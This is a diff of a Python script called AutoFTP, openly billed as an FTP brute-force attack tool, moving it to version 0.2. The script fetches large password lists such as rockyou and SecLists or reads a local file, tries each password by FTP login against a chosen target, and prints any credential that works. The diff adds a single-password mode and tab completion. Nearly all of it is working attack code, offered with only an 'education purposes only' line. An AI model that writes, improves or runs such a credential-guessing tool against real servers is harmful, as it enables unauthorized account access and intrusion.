@@ -1,15 +1,15 @@
 #!/bin/python3
 #-*- coding: utf-8 -*-
-# 5/26/21 2021/26/05
+# 5/26/21 --- Revised: 11/19/21
 # AutoFTP is for education purposes only ! 
 # 2015-2021 WaXxX <wax@Windows95>
-import sys, time, os, argparse, requests, signal, re, threading;
+import sys, time, os, argparse, requests, signal, re, threading, readline;
 from ftplib import *;from time import sleep;from sys import exit;
 from datetime import datetime;from threading import Thread;
 WHITE=('\033[38;5;15m');
 GREEN=('\033[38;5;46m');
-DARK=('\033[38;5;242m');
-BLUE=('\033[38;5;21m');
+DARK=('\033[38;5;245m');
+BLUE=('\033[38;5;51m');
 RED=('\033[38;5;1m');
 BOLD=('\033[01m');
 UNDERLINE=('\033[04m');
@@ -17,9 +17,10 @@ STRIKE=('\033[09m');
 DIM=('\033[2m');
 RESET=('\033[0m');
 BLINK=('\033[5m');
-Version=('V-0.1');
+Version=('V-0.2');
 user = ('{0}'.format(os.environ['USER']));
 script = (os.path.basename(sys.argv[0]));
+readline.parse_and_bind("tab: complete")
 headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'}
 lists = ({
 'https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top12Thousand-probable-v2.txt'#,
@@ -35,6 +36,13 @@ lists = ({
 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10000.txt',
 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-CBLUEentials/10k-most-common.txt'
 })
+def complete(text,state):
+    volcab = ['yes','no','anonymous','darkweb2017-top10000', 'milw0rm-dictionary',
+				'10k-most-common', 'probable-v2-top1575', 'rockyou', 'Top207-probable-v2',
+				'bt4-password', 'shortKrak', '2020-200_most_used_passwords', 'Most-Popular-Letter-Passes', 'darkc0de']
+    results = [x for x in volcab if x.startswith(text)] + [None]
+    return results[state]
+readline.set_completer(complete)
 def sigint_handler(signum, frame):
 	print('\nExiting.')
 	exit(0)
@@ -45,7 +53,7 @@ def banner():
 	print ( DARK+' '*25+'║'+BOLD+GREEN+' ┳━┓'+DARK+DIM+'┳ ┓┏┓┓┏━┓'+RESET+BOLD+BLUE+'┳━┓┏┓┓┳━┓'+DARK+'║' )
 	print ( DARK+' '*25+'║'+BOLD+GREEN+' ┃━┫'+DARK+DIM+'┃ ┃ ┃ ┃ ┃'+RESET+BOLD+BLUE+'┣━  ┃ ┃━┛'+DARK+'║' )
 	print ( DARK+' '*25+'║'+BOLD+GREEN+' ┛ ┇'+DARK+DIM+'┇━┛ ┇ ┛━┛'+RESET+BOLD+BLUE+'┇   ┇ ┇  '+DARK+'║' )
-	print ( DARK+' '*25+'║'+BOLD+GREEN+DIM+f'	  {Version}'+RESET+BOLD+DARK+'		║' )
+	print ( DARK+' '*25+'║'+BOLD+GREEN+DIM+f'	  {Version}'+RESET+BOLD+DARK+'	        ║' )
 	print ( DARK+' '*25+'╚══════════════════════╝' )
 	sleep(1)
 	os.system('clear')
@@ -71,21 +79,26 @@ def echo_f(data):
 		sleep(0.001)
 	print(DARK+' '*2+'['+WHITE+'-'+RED+'!'+WHITE+'-'+DARK+']')
 def Usage():
-	print (BLINK+BOLD+BLUE+UNDERLINE+'''
-AutoFTP Usage:'''+RESET+BOLD+BLUE+'''
-FTP brute force attack that has the feature of using local or remote wordlists.\nA total of 17,580,792+ words currently and more soon to come'''+DARK+'''
-# Local wordlist attack syntax:'''+GREEN+f'''
-{script} -t 192.168.56.104 -u admin -w dictionary.txt'''+DARK+'''
-# Remote wordlist mode syntax:'''+GREEN+f'''
-{script} -t 192.168.56.104 -u admin -o darkc0de.txt'''+DARK+f'''
-# Anonymous login syntax:'''+GREEN+f'''
-{script} -u anonymous -t ftp.ed.ac.uk'''+DARK+f'''
-# List all available remote wordlists and their word count:'''+GREEN+f'''
-{script} -l'''+DARK+'''
-# Show an exact total remote word count'''+GREEN+f'''
-{script} -c
-'''+BOLD+BLUE)
-
+	print (f'''
+{GREEN}Usage{WHITE} &&{GREEN} Info{WHITE}:{BLUE}
+{GREEN}A{DARK}uto{BLUE}FTP {DARK}is a brute force attack script that has the feature of using local or remote wordlists{WHITE}.\n{DARK}A total of {UNDERLINE}{GREEN}17{RESET}{BOLD}{WHITE},{UNDERLINE}{GREEN}580{RESET}{BOLD}{WHITE},{UNDERLINE}{GREEN}792{RESET}{BOLD}{DARK}+ {DARK}words currently and more soon to come{WHITE} !
+{GREEN}This script now has tab completion{WHITE}.\n{DARK}Press tab on any input function to see the auto-completions available {WHITE}!
+{WHITE}# {BLUE}Local wordlist attack syntax{WHITE}:{GREEN}
+{script} {DARK}-t {GREEN}192{WHITE}.{GREEN}168{WHITE}.{GREEN}56{WHITE}.{GREEN}104 {DARK}-u {GREEN}admin {DARK}-w {GREEN}dictionary{WHITE}.{GREEN}txt
+{WHITE}# {BLUE}Remote wordlist mode syntax{WHITE}:{GREEN}
+{script} {DARK}-t {GREEN}192{WHITE}.{GREEN}168{WHITE}.{GREEN}56{WHITE}.{GREEN}104 {DARK}-u {GREEN}admin {DARK}-s {GREEN}darkc0de{WHITE}.{GREEN}txt
+{WHITE}# {BLUE}Anonymous login syntax{WHITE}:{GREEN}
+{script} {DARK}-u {GREEN}anonymous {DARK}-t {GREEN}ftp{WHITE}.{GREEN}ed{WHITE}.{GREEN}ac{WHITE}.{GREEN}uk
+{WHITE}# {BLUE}List all available remote wordlists and their word count{WHITE}:{GREEN}
+{script} {DARK}-l
+{WHITE}# {BLUE}Show an exact total remote word count{WHITE}:{GREEN}
+{script} {DARK}-c
+{WHITE}# {BLUE}Single password mode{WHITE}:{GREEN}
+{script} {DARK}-p
+''')
+def	debuggin(j):
+	print (f"debuggin' {j}")
+	return
 def do_now(target, *args, **kwargs):
 	m = Thread(target = target, args = args, kwargs = kwargs)
 	m.setDaemon(True)
@@ -95,21 +108,34 @@ class AutoFTP():
 	def __init__ (self):
 		self.session = requests.Session()
 		self.session.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'})
-		parser = argparse.ArgumentParser(description=BLUE+'::AutoFTP:: Brute force FTP accounts'+GREEN,add_help=False)
-		parser.add_argument('-t', '--target',required=False, action='store', help=GREEN+"Target to brute force")
-		parser.add_argument('-w', '--wordlist',required=False, action='store', help=GREEN+"Enter whole path to wordlist")
-		parser.add_argument('-u', '--username',required=False, action='store', help=GREEN+"Username to use for attack")
-		parser.add_argument('-s', '--scrape',required=False, action='store', help=GREEN+"Remotely scrape wordlists. Run -l/--list to see lists")
-		parser.add_argument('-l', '--list',required=False,action='store_true',  help=GREEN+"View available online wordlists")
-		parser.add_argument('-c', '--count',required=False,action='store_true',  help=GREEN+"Show the total available word count(Not necessary)")
-		parser.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS,help=GREEN+"Show this help menu")
+		parser = argparse.ArgumentParser(description=f'{WHITE}::{BLUE}AutoFTP Brute force FTP accounts{WHITE}::{GREEN}',add_help=False)
+		parser.add_argument('-t', '--target',required=False, action='store', help=f"{GREEN}Target to brute force")
+		parser.add_argument('-w', '--wordlist',required=False, action='store', help=f"{GREEN}Enter whole path to wordlist")
+		parser.add_argument('-u', '--username',required=False, action='store', help=f"{GREEN}Username to use for attack")
+		parser.add_argument('-s', '--scrape',required=False, action='store', help=f"{GREEN}Remotely scrape wordlists. Run -l/--list to see lists")
+		parser.add_argument('-l', '--list',required=False,action='store_true',  help=f"{GREEN}View available online wordlists")
+		parser.add_argument('-c', '--count',required=False,action='store_true',  help=f"{GREEN}Show the total available word count(Not necessary)")
+		parser.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS,help=f"{GREEN}Show this help menu")
+		parser.add_argument('-p', '--password',required=False, action='store', help=f"{GREEN}Single password")
 		args = parser.parse_args()
 		self.total_lists = ( len( lists ) )
 		if len(sys.argv) <= 1:
 			Usage()
+		if args.password:
+			self.target = args.target
+			if args.username:
+				self.user = args.username
+			else:
+				data = ( f"{RED}No username supplied" )
+				data += ( f"{WHITE} :: {BLUE}Enter a username now" )
+				echo_f ( data )
+				self.user = input( f"{BLUE}[ {DARK}{user}{BLUE}@{DARK}AutoFTP{BLUE} ~ ]{WHITE}$ {BLUE} " )
+			password = args.password
+			self.singlePass(password)
 		if args.count:
 			self.total_lists = ( len( lists ) )
-			data = ( BOLD+DARK+'Getting a '+BLUE+UNDERLINE+'total word count'+RESET+DARK+BOLD+' of all'+BLUE+BOLD+' ('+WHITE+UNDERLINE+f'{int(self.total_lists)}'+RESET+BOLD+BLUE+')'+RESET+BOLD+DARK+' available remote wordlists'+RESET+BOLD )
+			#data = ( BOLD+DARK+'Getting a '+BLUE+UNDERLINE+'total word count'+RESET+DARK+BOLD+' of all'+BLUE+BOLD+' ('+WHITE+UNDERLINE+f'{int(self.total_lists)}'+RESET+BOLD+BLUE+')'+RESET+BOLD+DARK+' available remote wordlists'+RESET+BOLD )
+			data = ( f"{BOLD}{DARK}Getting a {BLUE}{UNDERLINE}total word count{RESET}{DARK}{BOLD} of all{BLUE} ({WHITE}{UNDERLINE}{int(self.total_lists)}{RESET}{BOLD}{BLUE}){DARK} available remote wordlists" )
 			echo_s ( data )
 			self.TotalWords()
 		if args.list:
@@ -118,7 +144,8 @@ class AutoFTP():
 			pass
 		try:
 			if len(args.target) <= 1:
-				data = ( BLUE+'No target supplied' )
+				#data = ( BLUE+'No target supplied' )
+				data = ( f"{BLUE}No target supplied" )
 				echo_f ( data )
 			else:
 				self.target = args.target;
@@ -126,7 +153,8 @@ class AutoFTP():
 			pass
 		try:
 			if len( args.username ) <= 1:
-				data = ( BLUE+'No username supplied' )
+				#data = ( BLUE+'No username supplied' )
+				data = ( f"{BLUE}No username supplied" )
 				echo_f ( data )
 		except:
 			pass
@@ -134,20 +162,22 @@ class AutoFTP():
 			if 'anon' in args.username:
 				self.user = 'anonymous'
 				self.anonymous()
-			else:
-				self.user = args.username
-				if args.scrape:
-					wordlist = args.scrape
-					data = ( DARK+'Using remote dictionary mode' )
-					echo_s ( data )
-					self.Scrape(wordlist)
-				elif args.wordlist:
-					wordlist = args.wordlist
-					data = ( DARK+'Using a local wordlist'+BLUE+':'+WHITE+f' {wordlist}' )
-					echo_s ( data )
-					self.Local( wordlist )
 		except:
 			pass
+		else:
+			self.user = args.username
+			if args.scrape:
+				wordlist = args.scrape
+				#data = ( DARK+'Using remote dictionary mode' )
+				data = ( f"{DARK}Using a remote wordlist" )
+				echo_s ( data )
+				self.Scrape(wordlist)
+			elif args.wordlist:
+				wordlist = args.wordlist
+				#data = ( DARK+'Using a local wordlist'+BLUE+':'+WHITE+f' {wordlist}' )
+				data = ( f"{DARK}Using a local wordlist{BLUE}:{WHITE} {wordlist}" )
+				echo_s ( data )
+				self.Local( wordlist )
 	def anonymous(self):
 		dirs = []
 		try:
@@ -161,7 +191,23 @@ class AutoFTP():
 			data = ( str(f'Anonymous FTP login @{self.target} failed') )
 			echo_f ( data )
 			return False
+	def	singlePass(self, password):
+		tries = int(1)
+		total_words = int(1)
+		data = (f"{WHITE}#{tries} {DARK}Trying login{BLUE}:{WHITE} {self.user}{BLUE}:{WHITE}{password}{DARK} against{BLUE}:{WHITE} {self.target}{BLUE} {round((tries/total_words)*100, 2)}%")
+		echo_s ( data )
+		try:
+			ftp = FTP( self.target )
+			ftp.login( self.user, password )
+			data = ( f"{GREEN}Success{BLUE}: {WHITE}#{DARK}Pass{WHITE}: {GREEN}{password}{WHITE} #{DARK}User{WHITE}: {GREEN}{self.user} {WHITE}#{DARK}Target{WHITE}: {GREEN}{self.target}")
+			echo_s ( data )
+			ftp.quit()
+			quit
+			return True
+		except:
+			pass
 	def TotalWords(self):
+		# 4,701,158 words
 		start = time.time()
 		final_count = 0
 		sys.setrecursionlimit(1000000)
@@ -174,11 +220,49 @@ class AutoFTP():
 			do_now(target=self.session.get,**{'url':total,'data':str(words)})
 		end = time.time()
 		elapsed = (int( end - start ))
-		data = ( BOLD+DARK+DIM+'There are '+BOLD+RESET+WHITE+f'{self.total_lists}'+DARK+DIM+BOLD+' available wordlists with'+RESET+BOLD+WHITE+f' {final_count}'+DARK+'. Fetched in '+RESET+WHITE+BOLD+f'{elapsed}'+DARK+' seconds' )
+		#data = ( BOLD+DARK+DIM+'There are '+BOLD+RESET+WHITE+f'{self.total_lists}'+DARK+DIM+BOLD+' available wordlists with'+RESET+BOLD+WHITE+f' {final_count}'+DARK+'. Fetched in '+RESET+WHITE+BOLD+f'{elapsed}'+DARK+' seconds' )
+		data = ( f"{BOLD}{DARK}There's {WHITE}{self.total_lists}{DARK} available wordlists with {WHITE}{final_count}{BLUE}.{DARK} Fetched in {WHITE}{elapsed}{DARK} seconds")
 		echo_s ( data )
 	def Wordlists(self):
-		data = ( BOLD+DARK+'Listing all'+BLUE+' ('+WHITE+UNDERLINE+f'{int(self.total_lists)}'+RESET+BOLD+BLUE+')'+RESET+BOLD+DARK+' available remote wordlists'+RESET+BOLD )
+		#data = ( BOLD+DARK+'Listing all'+BLUE+' ('+WHITE+UNDERLINE+f'{int(self.total_lists)}'+RESET+BOLD+BLUE+')'+RESET+BOLD+DARK+' available remote wordlists'+RESET+BOLD )
+		data = ( f"{BOLD}{DARK}Listing all{BLUE} ({WHITE}{UNDERLINE}{int(self.total_lists)}{RESET}{BOLD}{BLUE}){DARK} available remote wordlists" )
 		echo_s ( data )
+		wordlits = [
+					'darkweb2017-top10000',
+					'milw0rm-dictionary',
+					'10k-most-common',
+					'probable-v2-top1575',
+					'rockyou',
+					'Top207-probable-v2',
+					'bt4-password',
+					'shortKrak',
+					'2020-200_most_used_passwords',
+					'Most-Popular-Letter-Passes',
+					'darkc0de'
+		]
+		data = ( f"{DARK}Wordlist{BLUE}: darkweb2017-top10000{DARK} contains{BLUE}:{WHITE} 9954{DARK} words" )
+		echo_s ( data )
+		data = ( f"{DARK}Wordlist{BLUE}: milw0rm-dictionary{DARK} contains{BLUE}:{WHITE} 84193{DARK} words" )
+		echo_s ( data )
+		data = ( f"{DARK}Wordlist{BLUE}: 10k-most-common{DARK} contains{BLUE}:{WHITE} 10000{DARK} words" )
+		echo_s ( data )
+		data = ( f"{DARK}Wordlist{BLUE}: probable-v2-top1575{DARK} contains{BLUE}:{WHITE} 1575{DARK} words" )
+		echo_s ( data )
+		data = ( f"{DARK}Wordlist{BLUE}: rockyou{DARK} contains{BLUE}:{WHITE} 14323092{DARK} words" )
+		echo_s ( data )
+		data = ( f"{DARK}Wordlist{BLUE}: Top207-probable-v2{DARK} contains{BLUE}:{WHITE} 207{DARK} words" )
+		echo_s ( data )
+		data = ( f"{DARK}Wordlist{BLUE}: bt4-password{DARK} contains{BLUE}:{WHITE} 1647019{DARK} words" )
+		echo_s ( data )
+		data = ( f"{DARK}Wordlist{BLUE}: shortKrak{DARK} contains{BLUE}:{WHITE} 3593{DARK} words" )
+		echo_s ( data )
+		data = ( f"{DARK}Wordlist{BLUE}: 2020-200_most_used_passwords{DARK} contains{BLUE}:{WHITE} 197{DARK} words" )
+		echo_s ( data )
+		data = ( f"{DARK}Wordlist{BLUE}: Most-Popular-Letter-Passes{DARK} contains{BLUE}:{WHITE} 47423{DARK} words" )
+		echo_s ( data )
+		data = ( f"{DARK}Wordlist{BLUE}: darkc0de{DARK} contains{BLUE}:{WHITE} 1464905{DARK} words" )
+		echo_s ( data )
+		"""
 		start = time.time()
 		for link in lists:
 			cut1 = link.rsplit( '/',1 )[-1]
@@ -190,28 +274,38 @@ class AutoFTP():
 			if wordlist == ( 'probable-v2-top1575' ):
 				total_words = 1575
 			do_now(target=self.session.get,**{'url':link,'data':str(passwords)})
-			data = ( DARK+'Wordlist'+BLUE+':'+WHITE+f' {wordlist}'+DARK+' contains'+BLUE+':'+WHITE+f' {total_words}'+DARK+' words' )
+			#data = ( DARK+'Wordlist'+BLUE+':'+WHITE+f' {wordlist}'+DARK+' contains'+BLUE+':'+WHITE+f' {total_words}'+DARK+' words' )
+			data = ( f"{DARK}Wordlist{BLUE}:{WHITE} {wordlist}{DARK} contains{BLUE}:{WHITE} {total_words}{DARK} words")
 			echo_s ( data )
 		end = time.time()
 		elapsed = (int( end - start ))
+	"""
+
 	# 🠋 Not sure whether I'm keeping 🠋
-		data = ( DARK+'Choose wordlist and start attack now '+BLUE+'? '+DARK+'['+BLUE+'yes'+WHITE+'/'+BLUE+'no'+DARK+']' )
+		#data = ( DARK+'Choose wordlist and start attack now '+BLUE+'? '+DARK+'['+BLUE+'yes'+WHITE+'/'+BLUE+'no'+DARK+']' )
+		data = ( f"{DARK}Choose a wordlist and start attack now{BLUE} ?{DARK} [{BLUE}yes{WHITE}/{RED}no{DARK}]" )
 		echo_s ( data )
-		answer = input(BLUE+'[ '+DARK+f'{user}'+BLUE+'@'+DARK+'AutoFTP'+BLUE+' ~ '+BLUE+']'+WHITE+'$ '+BLUE+' ')
+		#answer = input(BLUE+'[ '+DARK+f'{user}'+BLUE+'@'+DARK+'AutoFTP'+BLUE+' ~ '+BLUE+']'+WHITE+'$ '+BLUE+' ')
+		answer = input( f"{BLUE}[ {DARK}{user}{BLUE}@{DARK}AutoFTP{BLUE} ~ ]{WHITE}$ {BLUE} " )
 		if 'n'.upper() in answer or 'n'.lower() in answer:
-			data = ( DARK+'Use '+BLUE+'`'+DARK+'autoftp '+BLUE+'-u'+DARK+' <'+BLUE+'user'+DARK+'> '+BLUE+'-t '+DARK+'<'+BLUE+'target'+DARK+'>'+WHITE+' ['+BLUE+'-w'+DARK+' <'+BLUE+'local_wordlist'+DARK+'> '+WHITE+'/ '+BLUE+'-o '+DARK+'<'+BLUE+'remote_wordlist'+DARK+'>'+WHITE+']'+BLUE+'`')
-			echo_f ( data )
+			#data = ( DARK+'Use '+BLUE+'`'+DARK+'autoftp '+BLUE+'-u'+DARK+' <'+BLUE+'user'+DARK+'> '+BLUE+'-t '+DARK+'<'+BLUE+'target'+DARK+'>'+WHITE+' ['+BLUE+'-w'+DARK+' <'+BLUE+'local_wordlist'+DARK+'> '+WHITE+'/ '+BLUE+'-o '+DARK+'<'+BLUE+'remote_wordlist'+DARK+'>'+WHITE+']'+BLUE+'`')
+			data = ( f"{DARK}Use {BLUE}'{DARK}{script}{BLUE} -u{DARK} <{BLUE}user{DARK}>{BLUE} -t {DARK}<{BLUE}target{DARK}>{WHITE} [{BLUE}-w{DARK} <{BLUE}local_wordlist{DARK}> {WHITE}/{BLUE} -s{DARK} <{BLUE}remote_wordlist{DARK}>{WHITE}]{BLUE}'")
+			echo_f(data)
 		elif 'y'.upper() in answer or 'y'.lower() in answer:
-			data = ( DARK+'Enter the wordlist you\'d like to use' )
+			data = ( f"{DARK}Enter the wordlist you'd like to use" )
 			echo_s ( data )
-			wordlist = input(BLUE+'[ '+DARK+f'{user}'+BLUE+'@'+DARK+'AutoFTP'+BLUE+' ~ '+BLUE+']'+WHITE+'$'+BLUE+' ')
+			#wordlist = input(BLUE+'[ '+DARK+f'{user}'+BLUE+'@'+DARK+'AutoFTP'+BLUE+' ~ '+BLUE+']'+WHITE+'$'+BLUE+' ')
+			wordlist = input(f"{BLUE}[ {DARK}{user}{BLUE}@{DARK}AutoFTP{BLUE} ~ ]{WHITE}${BLUE} ")
 			ps1updte=wordlist#.rsplit('.',1)[-2]
-			data = ( DARK+'Enter the target\'s IP or domain name' )
+			#data = ( DARK+'Enter the target\'s IP or domain name' )
+			data = ( f"{DARK}Enter the target's IP or domain name" )
 			echo_s ( data )
-			self.target = input(BLUE+'[ '+DARK+f'{user}'+BLUE+'@'+DARK+'AutoFTP'+BLUE+' ~/'+WHITE+f'{ps1updte} '+BLUE+']'+WHITE+'$'+BLUE+' ')
-			data = ( DARK+'Enter the username' )
+			#self.target = input(BLUE+'[ '+DARK+f'{user}'+BLUE+'@'+DARK+'AutoFTP'+BLUE+' ~/'+WHITE+f'{ps1updte} '+BLUE+']'+WHITE+'$'+BLUE+' ')
+			self.target = input(f"{BLUE}[{DARK}{user}{BLUE}@{DARK}AutoFTP{BLUE} ~/{WHITE}{ps1updte} {BLUE}]{WHITE}${BLUE} ")
+			data = ( f"{DARK}Enter the username" )
 			echo_s ( data )
-			self.user = input(BLUE+'[ '+DARK+f'{user}'+BLUE+'@'+DARK+'AutoFTP'+BLUE+' ~/'+WHITE+f'{ps1updte}'+BLUE+'/'+WHITE+f'{self.target} '+BLUE+']'+WHITE+'$'+BLUE+' ')
+			#self.user = input(BLUE+'[ '+DARK+f'{user}'+BLUE+'@'+DARK+'AutoFTP'+BLUE+' ~/'+WHITE+f'{ps1updte}'+BLUE+'/'+WHITE+f'{self.target} '+BLUE+']'+WHITE+'$'+BLUE+' ')
+			self.user = input( f"{BLUE}[ {DARK}{user}{BLUE}@{DARK}AutoFTP{BLUE} ~/{WHITE}{ps1updte}{BLUE}/{WHITE}{self.target} {BLUE}]{WHITE}$ {BLUE}" )
 			self.Scrape( wordlist )
 	# 🠉 End of not sure 🠉
 
@@ -243,7 +337,8 @@ class AutoFTP():
 		elif '10k-most-common'.lower() or '10k-most-common'.upper() in wordlist:
 			link = ('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-CBLUEentials/10k-most-common.txt')
 		else:
-			data = ( BLINK+BLUE+BOLD+DIM+'Oops ! Something went wrong'+RESET+BOLD )
+			#data = ( BLINK+BLUE+BOLD+DIM+'Oops ! Something went wrong'+RESET+BOLD )
+			data = ( f"{BLINK}{BLUE}{BOLD}{DIM}Oops ! Something went wrong{RESET}{BOLD}")
 			echo_f ( data )
 		page = self.session.get(link,headers=headers).text
 		passwords = list(set(re.findall('([0-9A-Za-z _\+#$@!&<?>\'"}*{\(\)?%.;:, -:]+)',page)))
@@ -254,17 +349,19 @@ class AutoFTP():
 			total_words = 10000
 		elif wordlist == ( 'Top207-probable-v2' ):
 			total_words = 207
-		data = ( DARK+'Wordlist'+BLUE+': '+WHITE+f'{wordlist}'+DARK+' contains'+BLUE+': '+WHITE+f'{total_words}'+DARK+' words' )
+		#data = ( DARK+'Wordlist'+BLUE+': '+WHITE+f'{wordlist}'+DARK+' contains'+BLUE+': '+WHITE+f'{total_words}'+DARK+' words' )
+		data = ( f"{DARK}Wordlist{BLUE}:{WHITE} {wordlist}{DARK} contains{BLUE}:{WHITE} {total_words}{DARK} words")
 		echo_s ( data )
 		for password in passwords:
 			tries += 1
-			data = ( WHITE+f'#{tries} '+DARK+'Trying password'+BLUE+': '+WHITE+f'{password} '+DARK+'against'+BLUE+': '+WHITE+f'{self.target} '+BLUE+f'{round((tries/total_words)*100, 2)}%' )
+			#data = ( WHITE+f'#{tries} '+DARK+'Trying password'+BLUE+': '+WHITE+f'{password} '+DARK+'against'+BLUE+': '+WHITE+f'{self.target} '+BLUE+f'{round((tries/total_words)*100, 2)}%' )
+			data = (f"{WHITE}#{tries} {DARK}Trying password{BLUE}:{WHITE} {password}{DARK} against{BLUE}:{WHITE} {self.target}{BLUE} {round((tries/total_words)*100, 2)}%")
 			echo_s ( data )
 			do_now(target=self.session.get,**{'url':link,'data':str(passwords)})
 			try:
 				ftp = FTP( self.target )
 				ftp.login( self.user, password )
-				data = ( GREEN+'Success'+BLUE+': '+WHITE+'#'+DARK+'Pass'+WHITE+': '+GREEN+f'{password} '+WHITE+'#'+DARK+'User'+WHITE+': '+GREEN+f'{self.user} '+WHITE+'#'+DARK+'Target'+WHITE+': '+GREEN+f'{self.target}' )
+				data = ( f"{GREEN}Success{BLUE}: {WHITE}#{DARK}Pass{WHITE}: {GREEN}{password}{WHITE} #{DARK}User{WHITE}: {GREEN}{self.user} {WHITE}#{DARK}Target{WHITE}: {GREEN}{self.target}")
 				echo_s ( data )
 				ftp.quit()
 				quit
@@ -274,20 +371,21 @@ class AutoFTP():
 	def Local( self, wordlist ):
 		start = time.time()
 		tries = 0
-		f = open( wordlist )
-		passwords = f.read().splitlines()
-		f.close()
+		input_file = open(f"{wordlist}", errors="surrogateescape")
+		passwords = input_file.readlines()
 		total_words = len( passwords )
-		data = ( DARK+'Wordlist'+BLUE+': '+WHITE+f'{wordlist}'+DARK+' contains'+BLUE+': '+WHITE+f'{total_words}'+DARK+' words' )
+		#data = ( DARK+'Wordlist'+BLUE+': '+WHITE+f'{wordlist}'+DARK+' contains'+BLUE+': '+WHITE+f'{total_words}'+DARK+' words' )
+		data = ( f"{DARK}Wordlist{BLUE}:{WHITE} {wordlist}{DARK} contains{BLUE}:{WHITE} {total_words}{DARK} words")
 		echo_s ( data )
 		for password in passwords:
 			tries += 1
-			data = ( WHITE+f'#{tries} '+DARK+'Trying password'+BLUE+': '+WHITE+f'{password} '+DARK+'against'+BLUE+': '+WHITE+f'{self.target} '+BLUE+f'{round((tries/total_words)*100, 2)}%' )
+			#data = ( WHITE+f'#{tries} '+DARK+'Trying password'+BLUE+': '+WHITE+f'{password}{DARK} against{BLUE}: '+WHITE+f'{self.target} '+BLUE+f'{round((tries/total_words)*100, 2)}%' )
+			data = (f"{WHITE}#{tries} {DARK}Trying password{BLUE}:{WHITE} {password}{DARK} against{BLUE}:{WHITE} {self.target}{BLUE} {round((tries/total_words)*100, 2)}%")
 			echo_s ( data )
 			try:
 				ftp = FTP( self.target )
 				ftp.login( self.user, password )
-				data = ( GREEN+'Success'+BLUE+': '+WHITE+'#'+DARK+'Pass'+WHITE+': '+GREEN+f'{password} '+WHITE+'#'+DARK+'User'+WHITE+': '+GREEN+f'{self.user} '+WHITE+'#'+DARK+'Target'+WHITE+': '+GREEN+f'{self.target}' )
+				data = ( f"{GREEN}Success{BLUE}: {WHITE}#{DARK}Pass{WHITE}: {GREEN}{password}{WHITE} #{DARK}User{WHITE}: {GREEN}{self.user} {WHITE}#{DARK}Target{WHITE}: {GREEN}{self.target}")
 				echo_s ( data )
 				ftp.quit()
 				break
